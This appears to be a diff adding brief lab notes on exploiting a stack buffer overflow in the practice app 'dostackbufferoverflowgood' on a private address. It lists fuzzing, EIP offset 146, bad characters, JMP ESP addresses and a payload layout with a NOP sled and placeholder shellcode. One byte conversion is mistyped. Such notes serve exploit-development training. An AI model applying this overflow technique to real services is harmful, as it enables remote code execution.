@@ -1,0 +1,24 @@
+Application: dostackbufferoverflowgood
+
+IP 192.168.0.134
+
+Port : 31337 (Elite)
+
+_______________________________
+
+1. crashing remote server with fuzzing 1101
+
+2. Sending pattern find EIP= 39654138
+
+3. Offset 146
+
+4. Finding bad char \x00\x0a
+
+5., JMP ESP "\xFF\xE4"
+0x080414C3 => \xc3\x14\x04\08
+0x080416BF =>\xbf\x16\x04\x08
+
+6. sendpaylaod
+jmp_esp=struct.pack("<I", 0x080414C3) 
+
+buff="A" *146 + jmp_esp + "\x90" * 30 + Shellcode
